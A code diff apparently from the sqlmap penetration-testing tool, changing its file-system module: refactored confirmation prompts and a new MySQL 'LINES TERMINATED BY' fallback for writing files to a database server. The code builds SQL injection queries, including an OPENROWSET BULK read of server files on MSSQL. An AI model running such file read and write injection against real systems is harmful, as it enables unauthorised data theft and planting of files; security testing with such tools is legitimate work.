@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
-See the file 'doc/COPYING' for copying permission
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
 """
 
 import os
@@ -49,7 +49,7 @@ class Filesystem:
 
         elif Backend.isDbms(DBMS.MSSQL):
             self.createSupportTbl(self.fileTblName, self.tblField, "VARBINARY(MAX)")
-            inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField));
+            inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField))
 
             lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)
 
@@ -156,15 +156,15 @@ class Filesystem:
         return retVal
 
     def askCheckWrittenFile(self, localFile, remoteFile, forceCheck=False):
-        output = None
+        choice = None
 
         if forceCheck is not True:
             message = "do you want confirmation that the local file '%s' " % localFile
             message += "has been successfully written on the back-end DBMS "
             message += "file system ('%s')? [Y/n] " % remoteFile
-            output = readInput(message, default="Y")
+            choice = readInput(message, default='Y', boolean=True)
 
-        if forceCheck or (output and output.lower() == "y"):
+        if forceCheck or choice:
             return self._checkFileLength(localFile, remoteFile)
 
         return True
@@ -173,9 +173,8 @@ class Filesystem:
         message = "do you want confirmation that the remote file '%s' " % remoteFile
         message += "has been successfully downloaded from the back-end "
         message += "DBMS file system? [Y/n] "
-        output = readInput(message, default="Y")
 
-        if not output or output in ("y", "Y"):
+        if readInput(message, default='Y', boolean=True):
             return self._checkFileLength(localFile, remoteFile, True)
 
         return None
@@ -205,7 +204,7 @@ class Filesystem:
 
         self.checkDbmsOs()
 
-        for remoteFile in remoteFiles.split(","):
+        for remoteFile in remoteFiles.split(','):
             fileContent = None
             kb.fileReadMode = True
 
@@ -280,22 +279,28 @@ class Filesystem:
         self.checkDbmsOs()
 
         if localFile.endswith('_'):
-            localFile = decloakToTemp(localFile)
+            localFile = getUnicode(decloakToTemp(localFile))
 
         if conf.direct or isStackingAvailable():
             if isStackingAvailable():
                 debugMsg = "going to upload the file '%s' with " % fileType
-                debugMsg += "stacked query SQL injection technique"
+                debugMsg += "stacked query technique"
                 logger.debug(debugMsg)
 
             written = self.stackedWriteFile(localFile, remoteFile, fileType, forceCheck)
             self.cleanup(onlyFileTbl=True)
         elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
             debugMsg = "going to upload the file '%s' with " % fileType
-            debugMsg += "UNION query SQL injection technique"
+            debugMsg += "UNION query technique"
             logger.debug(debugMsg)
 
             written = self.unionWriteFile(localFile, remoteFile, fileType, forceCheck)
+        elif Backend.isDbms(DBMS.MYSQL):
+            debugMsg = "going to upload the file '%s' with " % fileType
+            debugMsg += "LINES TERMINATED BY technique"
+            logger.debug(debugMsg)
+
+            written = self.linesTerminatedWriteFile(localFile, remoteFile, fileType, forceCheck)
         else:
             errMsg = "none of the SQL injection techniques detected can "
             errMsg += "be used to write files to the underlying file "
